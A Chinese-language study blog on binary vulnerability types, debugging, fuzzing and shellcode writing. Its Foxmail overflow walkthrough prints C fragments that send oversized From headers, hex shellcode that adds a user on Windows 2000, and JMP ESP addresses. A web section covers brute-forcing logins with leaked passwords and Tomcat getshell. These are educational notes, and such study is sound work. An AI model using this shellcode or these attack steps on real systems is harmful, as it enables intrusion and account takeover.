<p>在运行程序后，传递给printf的参数只有test-%x，但他把输入参数test-%x之后的另一个栈上数据当做参数传给了printf函数，因为printf基本类型是printf（“格式化控制符”，变量列表）；</p>
<p>传递给printf参数只有一个，但是程序默认将栈上下一个数据作为参数传递给printf函数，刚好下一个数据是strcpy函数的目标地址，就是buff变量，buff刚好指向test-%x的地址0x0019fec4，所以程序会输出0x0019fec4，如果后面再加上%x就会将src参数值也输出了，这样就可以遍历整个栈上的数据了。</p>
<p>此外还可以使用%n写入数据修改返回地址来实现漏洞利用。</p>
<p>6）双重释放漏洞原理</p>
<p>Double Free漏洞是由于对同一块内存进行二次释放导致的，利用漏洞可以执行任意代码。在第二次释放p2时会发生程序崩溃，但是并不是每次出现Double Free都会发生崩溃，要有<strong>堆块合并动作</strong>发生才会发生崩溃。</p>
<p><strong><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590719859961.png" alt="1590719859961"></strong></p>
<p>在释放过程中，邻近的已经释放的堆块存在合并操作，这会改变原有堆头信息，之后再对其地址引用释放就会发生访问异常。</p>
<p>7）释放后重引用漏洞原理 UAF漏洞原理</p>
<p>buf2占了buf1的内存位置，经过UAF后，buf2被成功篡改</p>
<p>程序通过分配和buf1大小相同的堆块buf2实现占坑，buf2分配到已经释放的buf1内存位置，但是由于buf1指针仍然有效，并且指向的内存数据是不可预测的，可能被堆管理器回收，也可能被其他数据占用填充，buf1指针称为悬挂指针，借助悬挂指针buf1将内存赋值为hack，导致buf2也被篡改为hack。</p>
<p>如果原有漏洞程序引用到悬挂指针指向的数据用于执行指令，就会导致任意代码执行。在通常的浏览器UAF漏洞中，都是某个C++对象释放后重引用，假设程序存在UAF的漏洞，有个悬挂指针指向test对象，要实现漏洞利用，通过占坑的方式覆盖test对象虚表指针，虚表指针指向虚函数存放地址，现在让其指向恶意构造的shellcode，当程序再次引用到test对象就会导致任意代码执行。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590720390686.png" alt="1590720390686"></p>
<p>8）数组越界访问漏洞</p>
<p>数组访问越界漏洞包含读写类型，溢出属于数据写入</p>
<p>部分溢出漏洞本质是数组越界漏洞</p>
<p>前者像是倒水的时候倒错了杯子，溢出就像是水从杯子里溢出来</p>
<p>执行生成的程序，分别输入12345，当输入的数组下标为12的时候会得到正常数值，从索引3开始就超出了原来数组的范围。数组越界访问数组，导致读取不在程序控制范围内的数值。使用ollydbg调试发现array[5]就是从array开始的第六个数据0x4012A9，已经读取到了array之外的数据，如果越界访问距离过大，就会访问到不可访问的内存空间，导致程序崩溃。</p>
<p>9）类型混淆漏洞原理</p>
<p>类型混淆漏洞（Type Confusion）一般是将数据类型A当作数据类型B来解析引用，这就可能导致非法访问数据从而执行任意代码，比如将Unit转成了String，将类对象转成数据结构。</p>
<p>类型混淆型数据是现在浏览器漏洞挖掘的主流漏洞，这类漏洞在java，js等弱类型语言中非常常见。</p>
<p>以IE/Edge类型混淆漏洞（CVE-2017-0037）为例讲解，漏洞原因是函数处理时，没有对对象类型进行严格检查，导致类型混淆。</p>
<p>通过跟踪可以发现第一次调用Readable函数时ecx是一个正常的FlowItem对象，而第二次时是一个int Array Object。Layout::Patchable &gt;::Readable函数是处理虚表对象的函数，由于boom()函数中引用th1.align导致Readable函数得到第二次引用，由于没有进行对象属性检查，导致第二次调用时将table对象传入，最终发生类型混淆崩溃。</p>
<p>10）竞争条件漏洞原理</p>
<p>竞争条件（Race Condition）是由于多个线程/对象/进程同时操作同一资源，导致系统执行违背原有逻辑设定的行为，这类漏洞在linux，内核层面非常多见，在windows和web层面也存在。互斥锁的出现就是为了解决此类漏洞问题，保证某一对象在特定资源访问时其他对象不能操作此资源。</p>
<ol>
<li><p>漏洞类型</p>
<p>见第一部分</p>
</li>
<li><p>漏洞利用方法</p>
<p>漏洞分析方法<a href="https://www.cnblogs.com/freesec/p/6443870.html" target="_blank" rel="noopener">https://www.cnblogs.com/freesec/p/6443870.html</a></p>
<p>拿到poc分析漏洞成因关键步骤是定位到漏洞代码。</p>
<p><strong>栈溢出一般分析方法</strong></p>
<p>1基于字符串定位——当存在漏洞的代码片段引用了字符串时，IDA直接搜索，交叉引用，多处的话分别下断点看断在何处。</p>
<p>2基于栈回溯定位分析方法——当对字符串进行复制时溢出并向不可写的地方进行写入而发生异常，栈回溯并对返回地址上方进行反汇编，在这些call上下断点，可以断在漏洞代码附近。</p>
<p>基于污点追踪的漏洞分析方法——断在异常处代码时查看操作的寄存器值，向上追踪</p>
<p>针对activeX控件的分析方法——activeX控件注册到系统中后,在html中通过<object>标签的classid来引用, 在ie中对应的模块是oleaut32.dll, 函数是dispcallfunc.</p>
<p>在dispcallfunc函数中首个call ecx 即为activex中的被html调用的函数.可以直接在od中按 alt+e 找到模块,按ctrl+n找到函数. 然后找到call ecx跟进分析即可</p>
<p><strong>堆溢出一般分析方法:</strong></p>
<p>1.堆调试</p>
<p>!heap   查看程序用heapcreate函数创建的堆信息</p>
<p>!heap -p -a 地址    用于查看该地址的堆详细信息</p>
<p>dt _HEAP_FREE_ENTRY 地址      显示空闲堆块详细信息</p>
<p>dt _LIST_ENTRY　地址　　　　   显示系统链表结构信息</p>
<p>2.基于heapPage的分析方法</p>
<p>通过开启hpa后, 附加,加载poc,断下. 然后查看栈回溯,反汇编返回地址上方, 在上面找合适的地方下断点,重新运行调试断下,然后结合实际慢慢分析.</p>
<p>小技巧:当windows7这种系统有aslr时,直接对地址下断点可能有问题,所以可以直接用符号名代替,如bp mshtml!CTableLayout::CalculateMinMax</p>
<p>对上层函数下断:bp mshtml!CTableLayout::CalculateMinMax</p>
<p><strong>格式化字符串漏洞分析</strong></p>
<p>基于输出消息漏洞定位</p>
<p>其实就是一种字符串定位的方法</p>
<p>3.通过栈回溯和堆状态判断漏洞类型</p>
<p>4.基于ROP指令地址反向追踪</p>
</li>
</ol>
<ol>
<li><p>常见漏洞挖掘</p>
<p><a href="https://blog.csdn.net/stonesharp/article/details/50971701" target="_blank" rel="noopener">https://blog.csdn.net/stonesharp/article/details/50971701</a></p>
<p>二进制漏洞研究可以分为漏洞分析利用和漏洞挖掘两部分。漏洞挖掘方法较少。漏洞挖掘是一种注重结果不追求过程的工程。</p>
<p>1.手动法——不使用自动挖掘工具，手动进行分析，挖掘点是手动寻找的，畸形数据也是手动构造的。</p>
<p>优点：测试的主要是堆栈溢出漏洞，速度快，效率高。</p>
<p>缺点：文件格式漏洞难以挖掘</p>
<p>具体怎么挖掘：</p>
<p>1.确定挖掘点——凡是用户可控的数据点可以作为挖掘点。包括程序路径，输入消息，文件内配置消息等。</p>
<p>2.对挖掘点填充畸形数据——超长字符串，畸形字符，边界值数据等。超长字符串的效果更好，一般为堆栈溢出。</p>
<p>3.程序是否发生异常</p>
<p>4.分析——发生异常，用反汇编工具和汇编级调试器深入分析，找到异常原因，判断漏洞类型及危害。</p>
<h2 id="通用fuzz法进行漏洞挖掘："><a href="#通用fuzz法进行漏洞挖掘：" class="headerlink" title="通用fuzz法进行漏洞挖掘："></a><strong>通用fuzz法进行漏洞挖掘：</strong></h2><p>在不研究文件格式的情况下，用自动化测试工具对目标程序进行fuzz测试。</p>
<p>1.选取目标文件。<br>2.用我们的工具对目标文件的格式进行变异，生成大量的畸形样本。<br>3.让程序分别载入并解析这些畸形样本，监测程序是否会触发异常。<br>4.通过逆向分析这些异常样本，查看是否是漏洞同时确定危害级别。</p>
<p>评价一个通用fuzz工具的好坏，一般考虑以下两个方面<br>1.生成的样本是否足够畸形：只有样本足够畸形，才能保证覆盖面足够大，才能挖掘出更多的安全隐患。<br>2.监控功能是否足够的强大准确：通用fuzz的监控模块可以准确的监控到程序运行时所发生的异常。不误报，不漏报。</p>
</li>
</ol>
<h2 id="智能fuzz法进行漏洞挖掘"><a href="#智能fuzz法进行漏洞挖掘" class="headerlink" title="智能fuzz法进行漏洞挖掘"></a><strong>智能fuzz法进行漏洞挖掘</strong></h2><p>智能fuzz是对文件的结构进行分析，编写出表述文件结构的代码。然后fuzzer工具根据该代码的约束生成畸形样本，接下来就和通用fuzz相同了：执行畸形样本，监控异常。<br><strong>智能fuzz**</strong>的优点<strong>：执行效率高，效果好。可以挖掘其他方法挖掘不到的软件漏洞。<br>**智能fuzz缺点</strong>：需要深入研究相应的文件格式，并写出相应的文件格式脚本。该过程需要的时间较长。<br><strong>智能fuzz的步骤：</strong>1.研究要挖掘程序处理的相应文件格式，包括该格式的各种数据结构，约束规则等信息。<br>2.根据fuzzer规定的代码规则，编写相应规则的代码，来解析当前文件格式的结构。<br>3.用fuzzer工具通过我们写的代码，生成大量的畸形样本。<br>4.让fuzzer 执行并监控被挖掘程序处理畸形样本的运行情况，检测程序是否发生异常，如果异常保留异常样本和相关信息。<br>5.用OLLYDBG WINDBG IDA等工具深入分析崩溃信息，查看是否是漏洞同时确定危害级别。</p>
<p><a href="https://www.cesafe.com/html/3611.html常见漏洞挖掘思路：" target="_blank" rel="noopener">https://www.cesafe.com/html/3611.html常见漏洞挖掘思路：</a></p>
<p>前期信息收集</p>
<p>​    whois 站长之家 中国万网</p>
<p>​    社工库查询 尝试查询敏感信息</p>
<p>​    收集子域名，将其管理系统分开便于后期渗透 子域名扫描工具</p>
<p>​    github等代码托管工具 尝试获取敏感信息（数据库账号密码或者邮箱账号密码等）</p>
<p>web层漏洞挖掘</p>
<p>​    第一步获取得到的系统利用TOP500和自定义的密码字典爆破，尝试进入系统，进入以后，进行下一步漏洞挖掘——越权或SQL注入或任意文件上传；如果进入邮箱，把通讯录的人拔下来将其用户名加入TOP500爆破，其次查看是否具有一般邮箱的越权漏洞——越权查看他人邮件内容、任意密码修改、任意用户登录等，再利用社工库获得到的密码尝试进行登录，看是否成功或为管理员权限</p>
<p>挖掘子域名网站的SQL注入</p>
<p>挖掘逻辑漏洞 找一下修改地址 删除地址 尝试挖掘越权漏洞，如果存在可以支付的地方，可以尝试挖掘支付逻辑漏洞，一般把支付价格改为负数，如果有举报或反馈意见，可以尝试插一下</p>
<p>挖掘环境漏洞 看端口有么有配置环境啥的 tomcat有没有弱口令 有 getshell</p>
<p>扫描目录</p>
<p>挖掘APP层漏洞</p>
<p>很多app都是json传递数据的，json也是存在注入的，还有一些常见的漏洞——越权。sql注入，任意用户注册，任意用户密码重置，任意用户未授权登录，短信轰炸，拒绝服务等。如果想深入，可以学反编译，破解算法。</p>
<ol>
<li>shellcode编写</li>
</ol>
<p>shellcode是用来发送到服务器利用特定漏洞的代码，能在极小空间内完成一些基本且重要的工作。</p>
<p>编写方式3种：</p>
<p>1.直接编写16进制操作码，不现实</p>
<p>2.像C高级编写程序，编译后进行反汇编以获取汇编指令和十六进制操作码</p>
<p>3.编译汇编程序，将该程序汇编，从二进制中提取十六进制操作码</p>
<p>C语言编写注意事项：1.系统调用2.坏字符问题。shellcode一般是由十几或者几十个字节组成，这样的小程序如果要像linux服务程序一样引入头文件，导入符号表，调用系统函数，那么十几个字节根本就不能满足要求，因此需要利用系统最核心的调用机制，即通过软中断的方式获取需要的资源，以绕开系统调用。shellcode如果存储在堆或者栈的内存中，这样执行时就不能出现\x00这样的阶段字符，需要我们在构造shellcode时防止此类坏字符的出现。</p>
<p>提取shellcode</p>
<p>Int 0x80软中断调用</p>
<p>第一步，就是需要将系统调用号加入到eax中。</p>
<p>第二步，ebx用于保存函数调用的第一个参数（ecx存放第二个参数，edx存放第三个参数，esi存放第四个参数，edi存放第五个参数）</p>
<p>如果参数个数超过5个，那么就必须将参数数组存储在内存中，而且必须将该数组的地址存储在ebx中。</p>
<p>一旦加载寄存器之后，就会调用int 0x80 汇编指令来发出软中断，强迫内核暂停手头上的工作并处理该中断。</p>
<h4 id="验证int-0x80-调用"><a href="#验证int-0x80-调用" class="headerlink" title="验证int 0x80 调用"></a>验证int 0x80 调用</h4><h3 id="编写汇编源码"><a href="#编写汇编源码" class="headerlink" title="编写汇编源码"></a>编写汇编源码</h3><p>一般来说shellcode的总长度都非常短，所以可以直接采用汇编形式编写，这样不但可以直接通过软中断形式执行系统调用，而且可以控制坏字符的出现。如下图所示，为一个返回汇编行的shellcode代码</p>
<p>通过Metaspolit的shellcode自动生成工具可以自动生成各种功能shellcode，为快速利用漏洞攻击系统提供更便捷方式。但是如果想自己想学习shellcode的编写过程还是需要亲身试验，亲自操作，才能发现问题，解决问题。</p>
<p><a href="https://www.cnblogs.com/binarysystemloophole/articles/10576310.html" target="_blank" rel="noopener">https://www.cnblogs.com/binarysystemloophole/articles/10576310.html</a> Shellcode编写 定位API内容</p>
<p>加密与解密解压码<a href="http://www.sanye.cx" target="_blank" rel="noopener">www.sanye.cx</a></p>
<p>Q版缓冲区溢出教程笔记</p>
<p>第一章、Windows 下堆栈溢出入门</p>
<p>现在最流行的有攻击手段两种方式，一种是SQL注入，另一种就是缓冲 区溢出攻击。</p>
<p>在计算机内部，输入数据通常被存放在一个临时空间内， 这个临时存放空间就被称为缓冲区，缓冲区的长度事先已经被程序或者操作系统定义好了。缓冲区就很像那个 啤酒杯，用来装东西，而且大小固定。”“向缓冲区内填充数据，如果数据的长度很长（如同那瓶啤酒），超过了缓冲区（那个啤酒杯）本身的容量， 那么结果就如同啤酒一样，四处溢出，数据也会溢出存储空间！装不下的啤酒会流到桌子上，而装不下的数据 则会覆盖在合法数据上，这就是缓冲区和缓冲区溢出的道理。”</p>
<p>先把缓存区溢出利用理解为允许攻击者往某个程序变量中放一个比期望长 度要长的值，由此以当前运行该程序的用户的特权执行任意命令。</p>
<p>关键——Windows 系统内部处理缓冲区的机制，我们明白了这个之后，就可利用缓冲区溢出漏洞来控制别人的主 机。</p>
<p>strcpy（des，source） 不检查拷贝的长度，它会一直拷贝，直到source结尾，即是strcpy的弱点。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590738829103.png" alt="1590738829103"></p>
<p>Windows的运行机制——中断和堆栈</p>
<p>中断及其处理过程</p>
<p>堆栈——计算机为了能回头处理原来的事情，需要把原来指令的指针EIP保存在堆栈中； 当要回去原来的地方时，就把保存在堆栈中的EIP恢复即可。并且各个函数的局部变量的分配也是在堆栈中。堆栈是一种数据结构，遵循“先进后出，后进先出”的规则，存取的动作就是PUSH和POP。windows下堆栈的分配是高地址往低地址分配的。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590739035362.png" alt="1590739035362"></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590739080500.png" alt="1590739080500"></p>
<p>因此可以通过覆盖EIP为任意值让程序运行到一个错误的地方。——想要的程序shellcode——实现任意功能的代码</p>
<p>Shellcode编写</p>
<p><em>Windows不像Unix那样使用系统调用来实现关键函数。Windows通过动态链接库来提供系统函数，就是 所谓的Dll。</em></p>
<p>程序变成机器码——在VC中按F10调试，在Debug工具栏中点击最后一个Disassemble，出现源程序的汇编代码，然后在代码窗口点击鼠标右键，弹出菜单选择Code Bytes。</p>
<p>需要做一些相关工作才可以直接抄取机器码，shellcode会在后面讲到。</p>
<p>本地缓冲区溢出简单利用</p>
<p>缓冲区溢出的基本原理和精髓——1.返回点定位：知道有问题程序返回的精确位置，2shellcode编写：有shellcode，3把有问题程序返回点地址覆盖成shellcode的地址。关于第三部，1999年天才想法——：用系统核心dll里的指令来完成跳转！</p>
<p><em>过去Unix的覆盖方法：</em></p>
<p><em>1.NNNNNNNNNSSSSSSSSSSSRRRRRRRRRRRRRR型。适合于大缓冲区，“N”代表空指令，也就是0x90，在实际运行 中，程序将什么也不做，而是一直延着这些NOPS运行下去，直到遇到不是NOPS的指令再执行之；“S”代表ShellCode；“R”代表覆盖的返回地址，思路是把返回地址R覆盖为nops的大概位置，这样就会跳到Nop中， 然后继续执行，直到我们的ShellCode中。但这种方法由于定位不准确，所以使用起来也不准确。</em><br><em>2.RRRRRRRRRRNNNNNNNNNNNSSSSSSSSSS型。 是用大量的“R” 填满整个缓冲区， 然后大量的Nop， 最后是ShellCode。 这里，“R”往后跳到Nop中，再顺着往下执行就会到ShellCode中。但在Windows下，“R”中必定会含有0， 这样，整个构造就会被截断，只能用于Unix中。</em><br><em>Windows的系统核心dll包括kernel32.dll、user32.dll、gdi32.dll。这些dll一直位于内存中，而且对应 于固定的版本，Windows加载的位置是固定的。</em></p>
<p>在Windows下如何利用系统核心dll里的指令来完成跳转？用系统核心dll 中的jmp esp地址来覆盖返回地址，而把ShellCode紧跟在后面，这样就可跳转到我们的ShellCode 中。其利 用格式是 NNNNNNRSSSSSS，N＝Nop， S＝ShellCode， R＝jmp esp的地址 </p>
<p>理解关键——覆盖后的缓冲区如图，N表示NOP，存原EIP的地方覆盖成了JMP ESP地址，接下去的S0,S1等表示Shellcode开始的0字节，1字节等。函数执行完毕，要返回时堆栈指针ESP会指向保存原EIP的地方，而指令指针EIP指向Ret指令。 </p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590739774369.png" alt="1590739774369"></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590739931489.png" alt="1590739931489"></p>
<p>Ret相当于 Pop EIP ，就是把栈顶指针ESP指向的值弹出来给EIP。所以在正常情况下，Ret执行后，就可 把原来的EIP恢复，从而回到中断前的流程。</p>
<p>但保存的EIP已经被我们覆盖成JMP ESP指令的地址了。这样执行 Pop EIP 后，EIP会被改为JMP ESP 的地址，即指向JMP ESP。而堆栈指针ESP往下移一位，指向ShellCode的第一个字节。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590739997458.png" alt="1590739997458"></p>
<p>计算机会往下继续执行EIP指向的指令——JMP ESP ,而ESP指向的是S0，这样就JMP 到了S0中，开始执行shellcode了。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590740081376.png" alt="1590740081376"></p>
<p><em>EIP指令指针指向下一条要执行的命令，一般会自动加1。ESP堆栈顶指针指向堆栈的顶部。在PUSH 时，ESP往上走，减1；在POP时，ESP往下走，加1。</em></p>
<p>JMP ESP ——FF E4机器码 ——0x77e0492b（windows 2000 sp2）</p>
<p>程序返回时，执行Ret=POP EIP ，EIP就会变成0x77e0492b，而ESP往下走，指向Shellcode第一个字节中。系统执行EIP指向的指令，跳转ESP，而此时ESP指向的是Shellcode的第一个字节，正好进入到我们的Shellcode中。</p>
<p>这里JMP ESP的地址，会由于版本的不同而不一样。比如在Win2000 的User32.dll 中，JMP ESP指令的地址分别为： <em>sp0:0x77e2e32a、 sp1:0x77e8898b、 sp2:0x77e0492b、 sp3:0x77e188a7、 sp4:0x77e22c75。</em> 以前很多攻击利用程序需要带上对方版本的参数。<strong>后来发现了可以通用的地址。</strong>是什么？</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590740397359.png" alt="1590740397359"></p>
<p>小结：缓冲区溢出编程的基本原理和步骤，对一个有漏洞的程序通过精心构造数据，改变程序流程弹出了一个Dos窗口。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">​	LoadLibrary(<span class="string">"msvcrt.dll"</span>);</span><br><span class="line">​	system(<span class="string">"command.com"</span>);</span><br><span class="line">​	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Windows漏洞的缓冲区溢出利用编写</p>
<p>Foxmail溢出漏洞编写</p>
<p><em>FoxMail是国内著名的Internet电子邮件客户端软件。可以到其主页<a href="http://www.FoxMail.com.cn获得最新的信息" target="_blank" rel="noopener">www.FoxMail.com.cn获得最新的信息</a></em></p>
<p>分析漏洞公告</p>
<p>拿到公告之后——什么程序，什么版本有漏洞</p>
<p>Win2000 SP2+FoxMail5.0 beta1</p>
<p>除此之外，公告一般还会给出漏洞的解决办法或补丁下载。当然漏洞公告不会告诉如何利用漏洞的，所以除了查看楼顶公告，还要查找其他人或安全组织的相关漏洞分析报告。比如root关于FoxMail漏洞的分析</p>
<p>如何写出该缓冲区溢出的利用程序呢？</p>
<p>1.有问题程序返回点的精确位置――我们可以把它覆盖成任意地址。漏洞公告和漏洞分析——From字段太长就会覆盖到返回地址，程序很简单，往邮箱发送一封信，只有“From：字段”，对该字段进行填充，不能超过0x200长度，因此先填充0x150个A</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590801331139.png" alt="1590801331139"></p>
<p><em>*小知识：不同出错处理的外在表现</em><br>1.弹出“只有一个确定按钮的红叉框”，意味着外层有“<strong>try/</strong>except”块决定处理异常，而内层有“__ try/<strong>finally”块。当按下确定后，是在“</strong>try/<strong>finally”中执行。 2.弹出“有调试、关闭按钮的非红叉框”，意味着设置了“Just-In-Time Debugging”，并获得机会执行，这 已经是最后机会了。 3.弹出“只有一个关闭按钮的非红叉框”，意味着没有设置“Just-In-Time Debugging”，内层也没有决定处 理异常的“</strong>try/<strong>except”块。 4.触发异常，但什么框也未弹出，意味着内层有“</strong>try/__except”块决定处理异常。或者在异常处理过程中 再次触发异常。* </p>
<p>一个不能读，一个不能写——改进——采用二分法 0x150太长，换成0x75,0x75没有报错，试一下0x115，覆盖到0x104时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span> (<span class="built_in">buffer</span>, <span class="number">0x41</span>, <span class="number">0x104</span>);</span><br><span class="line"><span class="built_in">sprintf</span> (temp, <span class="string">"From: %s\r\n"</span>, <span class="built_in">buffer</span>); </span><br><span class="line">send (sock, temp, <span class="built_in">strlen</span> (temp), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">0x104</span>; i++) </span><br><span class="line">	<span class="built_in">buffer</span>[i] = <span class="string">'A'</span> + i % <span class="number">10</span>; </span><br><span class="line"><span class="built_in">sprintf</span> (temp, <span class="string">"From: %s\r\n"</span>, <span class="built_in">buffer</span>); </span><br><span class="line">send (sock, temp, <span class="built_in">strlen</span> (temp), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">0x104</span>; i++) </span><br><span class="line"><span class="built_in">buffer</span>[i] = <span class="string">'A'</span> + i / <span class="number">10</span>; </span><br><span class="line"><span class="built_in">sprintf</span> (temp, <span class="string">"From: %s\r\n"</span>, <span class="built_in">buffer</span>);</span><br></pre></td></tr></table></figure>

<p>分析：第一次使用2.c,是在‘From:’字段不停的加上A<del>J的循环（就是十六进制0x41</del>0x4A 这十个数的循 环）<strong>报错最小值为0x47</strong>。第二次用FoxMail3.c，是以10为一段长度，每段分别为0x41、0x42……来填充‘From:’<strong>报错为0x5A</strong></p>
<p>（0x5A－0x41）×10＋（0x47－0x41）＝25×10 ＋6＝256</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="string">'A'</span>, <span class="number">0x104</span>); </span><br><span class="line"><span class="built_in">buffer</span>[<span class="number">256</span>] = <span class="string">'B'</span>; </span><br><span class="line"><span class="built_in">buffer</span>[<span class="number">257</span>] = <span class="string">'B'</span>; </span><br><span class="line"><span class="built_in">buffer</span>[<span class="number">258</span>] = <span class="string">'B'</span>;</span><br><span class="line"><span class="built_in">buffer</span>[<span class="number">259</span>] = <span class="string">'B'</span>;</span><br></pre></td></tr></table></figure>

<p>指定‘From:’字段第256开始的四个字节是‘BBBB’，进行验证。在标准的堆栈溢出中，可以经常使用该方法进行定位。</p>
<p>2.ShellCode――一个提供给我们想要的功能的代码。 </p>
<p>就直接给出在中文Win2000 SP2下添加名为‘w’用户的 ShellCode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> ShellCode[] = <span class="string">"\x8B\xE5\x55\x8B\xEC\x33\xFF\x57\x57\x57\x57\xC7\x45\xF1\x6E\x65"</span> <span class="string">"\x74\x20\xC7\x45\xF5\x75\x73\x65\x72\xC7\x45\xF9\x20\x77\x20\x2E"</span> <span class="string">"\x80\x45\xFC\x01\xC6\x45\xFD\x61\xC6\x45\xFE\x64\x33\xC0\x88\x45"</span> <span class="string">"\xFF\x8D\x45\xF1\x50\xB8\x4A\x9B\x01\x78\xFF\xD0"</span> ;</span><br></pre></td></tr></table></figure>

<p>3.JMP ESP的地址――把返回点覆盖JMP ESP 的地址，这样可跳入ShellCode</p>
<blockquote>
<p>中文版Win2000、 XP、Win2003的JMP ESP 通用跳转地址（lion给出的0x7ffa4512）</p>
</blockquote>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590802080259.png" alt="1590802080259"></p>
<p>这样和最开始覆盖0x150个A测试时是类似的，Shellcode会把程序要写的参量覆盖，程序在返回之前会产生write类型错误！——①注意覆盖参量为可写的地址，即保证参量是可写的，不让他出现write错误，但是这种需要知道不能写的参量的所有位置；②覆盖异常，③Shellcode放在前面，不覆盖参量。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590802255755.png" alt="1590802255755"></p>
<p>总结：</p>
<blockquote>
<p>第一步、精确定位返回点。我们用求余取整法可巧妙得到返回位置。</p>
<p>第二步、ShellCode编写。我们直接用别人写好的ShellCode。</p>
<p>第三步、JMP ESP的地址。我们使用Lion共享的中文通用地址――0x7ffa4512。</p>
<p>最后把它们合起来，由于返回点后面不远处不能覆盖，所以我们把组合位置作稍稍改变，把ShellCode放前 面，RET后面放一个往前跳的指令，用这样的方式跳到我们的ShellCode中。</p>
</blockquote>
<p>IIS5.0 Printer漏洞。Win2000SP0、SP1版本</p>
<p>微软Win2K IIS5的打印ISAPI扩展接口建立了.printer扩展名到msw3prt.dll的映射关系，缺省情况下该 映射存在。当远程用户提交对.printer的URL请求时， IIS5调用msw3prt.dll解释该请求。由于msw3prt.dll 缺乏足够的缓冲区边界检查，远程用户可提交一个精心构造的针对.printer的URL 请求，这样，就会在 msw3prt.dll中发生典型的缓冲区溢出，潜在允许执行任意代码。——漏洞的背景和原因。</p>
<p>http://域填充到268 个字节时就可以覆盖到EIP。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590802478595.png" alt="1590802478595"></p>
<p>另一种溢出方式——JMP /CALL EBX——覆盖异常处理地址</p>
<p><strong>Windows 异常处理链表</strong></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590802584284.png" alt="1590802584284"></p>
<p>当系统遇到一个不知道如何处理的程序时，就会查找对应的异常处理程序，并将处理程序的地址赋给EIP，这样系统就会执行处理程序以避免系统崩溃。最后一个处理程序就是弹出对话框报错。<strong>异常处理也有很深的技术原理</strong></p>
<p>Windows 2000系统的知识——就是在判断是否使用现在指向的异常处理程序时，<strong>EBX会自动变为下一处理点的地址</strong>，这 样可以把异常处理地址连接起来，形成一个异常处理串</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590802993594.png" alt="1590802993594"></p>
<p>故意把返回地址覆盖成一个错误的地址，出错时windows就会跳到处理错误的入口点，而EBX就在入口前4个字节的地方。JMP 04往后跳四个字节。将错误入口覆盖为JMP EBX的地址，就会跳过覆盖值，到达我们的shellcode。接管异常。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590803269259.png" alt="1590803269259"></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590803348931.png" alt="1590803348931"></p>
<p>这里的A有多少呢？——不知道异常处理入口点在哪里呢？牛人的做法——用工具Attach 有问题的服务，然后反汇编、跟踪进去。找到有问题的点，就向上找到该服务的异常处理入口。直接分析出异 常处理入口位置距离溢出点的长度。菜鸟——比较简单，相对于直接分析服务，将JMP ESP方式改写为JMP EBX。</p>
<blockquote>
